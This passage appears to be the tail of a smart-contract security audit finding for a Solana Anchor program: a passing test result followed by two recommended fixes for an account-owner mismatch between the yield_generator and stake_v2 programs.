test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.03s
```
### Recommendation

- **Option A:** Change `Account<YieldState>` and `Account<UserPosition>` to `UncheckedAccount` or `AccountInfo`, and manually verify the owner and deserialize the data inside the instruction handler.
- **Option B:** If Anchor v2 allows, define an explicit `owner = yield_generator_program.address()` constraint on the `#[account(...)]` macro, or correctly configure the shared types such that `T::owner()` resolves to the `yield_generator` program ID instead of `stake_v2`.


